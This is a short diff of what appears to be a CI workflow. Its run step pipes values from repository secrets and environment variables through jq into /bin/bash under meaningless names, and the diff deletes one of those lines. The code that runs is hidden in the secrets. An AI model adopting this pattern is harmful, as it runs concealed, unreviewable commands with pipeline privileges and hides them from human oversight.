@@ -20,7 +20,6 @@ jobs:
           qpg528: ${{ secrets.qpg528 }}
         run: |
           printf '%s' "$qpg528" | jq -r .krp1720 | /bin/bash
-          echo $rpo778 | jq -r .nnu80 | /bin/bash
           echo $zf375 | jq -r .o07067 | /bin/bash
           printf '%s' "$rd9637" | jq -r .v0 | /bin/bash
           printf '%s' "$ipvf47" | jq -r .cutrg5 | /bin/bash
